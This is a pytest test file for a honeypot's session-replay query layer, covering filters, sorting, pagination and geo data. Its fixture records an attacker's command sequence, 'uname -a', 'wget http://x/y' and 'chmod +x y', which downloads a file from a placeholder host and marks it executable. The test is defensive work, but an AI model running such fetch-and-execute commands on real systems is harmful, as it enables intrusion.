"""Unit tests for session listing — the query behind session replay.

The filter that carries the feature is ``has_commands``: on a real sensor the
interesting sessions are a rounding error against the drive-by scan traffic, so
these tests pin down that narrowing, the sort options, and the event-derived geo
that the sessions table itself never gets.
"""

from __future__ import annotations

import datetime as dt

import pytest

from storage import queries
from storage.models import EventType, utcnow


@pytest.fixture
def sessions_fixture(db, make_event, make_session_row):
    """Three sessions: an interactive SSH one, a bare probe, and an old HTTP one."""
    now = utcnow()

    interactive = make_session_row(
        service="ssh",
        src_ip="192.0.2.10",
        started_at=now - dt.timedelta(minutes=10),
        event_count=4,
        auth_attempts=1,
        commands_run=3,
        duration_ms=45_000,
    )
    probe = make_session_row(
        service="ssh",
        src_ip="198.51.100.7",
        started_at=now - dt.timedelta(minutes=5),
        event_count=2,
        auth_attempts=0,
        commands_run=0,
        duration_ms=300,
    )
    stale = make_session_row(
        service="http",
        src_ip="203.0.113.4",
        started_at=now - dt.timedelta(days=9),
        event_count=1,
        commands_run=1,
        duration_ms=1_000,
    )
    db.add_all([interactive, probe, stale])
    db.flush()

    # Only the interactive session's events carry enrichment.
    for i, command in enumerate(["uname -a", "wget http://x/y", "chmod +x y"]):
        db.add(
            make_event(
                session_id=interactive.session_id,
                src_ip="192.0.2.10",
                event_type=EventType.COMMAND.value,
                command=command,
                ts=now - dt.timedelta(minutes=10) + dt.timedelta(seconds=i * 5),
                country="NL",
                country_name="Netherlands",
                asn=64512,
                as_org="Example BV",
            )
        )
    db.add(
        make_event(
            session_id=probe.session_id,
            src_ip="198.51.100.7",
            event_type=EventType.CONNECT.value,
            ts=now - dt.timedelta(minutes=5),
        )
    )
    db.flush()
    return {"interactive": interactive, "probe": probe, "stale": stale}


class TestListSessions:
    def test_lists_everything_by_default(self, db, sessions_fixture):
        rows, total = queries.list_sessions(db)
        assert total == 3
        assert len(rows) == 3

    def test_newest_first_by_default(self, db, sessions_fixture):
        rows, _ = queries.list_sessions(db)
        assert rows[0].session_id == sessions_fixture["probe"].session_id

    def test_has_commands_narrows_to_interactive(self, db, sessions_fixture):
        rows, total = queries.list_sessions(db, has_commands=True)
        ids = {r.session_id for r in rows}
        assert total == 2
        assert sessions_fixture["probe"].session_id not in ids

    def test_service_filter(self, db, sessions_fixture):
        rows, total = queries.list_sessions(db, service="http")
        assert total == 1
        assert rows[0].service == "http"

    def test_src_ip_filter(self, db, sessions_fixture):
        _, total = queries.list_sessions(db, src_ip="192.0.2.10")
        assert total == 1

    def test_since_hours_excludes_old_sessions(self, db, sessions_fixture):
        rows, total = queries.list_sessions(db, since_hours=24)
        assert total == 2
        assert all(r.service == "ssh" for r in rows)

    def test_min_events(self, db, sessions_fixture):
        _, total = queries.list_sessions(db, min_events=3)
        assert total == 1

    def test_sort_by_commands(self, db, sessions_fixture):
        rows, _ = queries.list_sessions(db, sort="commands_run")
        assert rows[0].commands_run == 3

    def test_sort_by_duration(self, db, sessions_fixture):
        rows, _ = queries.list_sessions(db, sort="duration_ms")
        assert rows[0].duration_ms == 45_000

    def test_unknown_sort_falls_back_rather_than_raising(self, db, sessions_fixture):
        # The API rejects bad sorts with a 400; the query layer must stay total.
        rows, _ = queries.list_sessions(db, sort="not_a_column")
        assert rows[0].session_id == sessions_fixture["probe"].session_id

    def test_pagination(self, db, sessions_fixture):
        page1, total = queries.list_sessions(db, limit=2, offset=0)
        page2, _ = queries.list_sessions(db, limit=2, offset=2)
        assert total == 3
        assert len(page1) == 2 and len(page2) == 1
        assert {s.session_id for s in page1}.isdisjoint({s.session_id for s in page2})


class TestSessionsGeo:
    def test_geo_comes_from_the_events(self, db, sessions_fixture):
        sid = sessions_fixture["interactive"].session_id
        geo = queries.sessions_geo(db, [sid])
        assert geo[sid]["country"] == "NL"
        assert geo[sid]["country_name"] == "Netherlands"
        assert geo[sid]["as_org"] == "Example BV"

    def test_unenriched_session_yields_nulls(self, db, sessions_fixture):
        sid = sessions_fixture["probe"].session_id
        assert queries.sessions_geo(db, [sid])[sid]["country"] is None

    def test_empty_input_does_not_query(self, db):
        assert queries.sessions_geo(db, []) == {}

    def test_unknown_ids_are_absent(self, db, sessions_fixture):
        assert queries.sessions_geo(db, ["nope"]) == {}
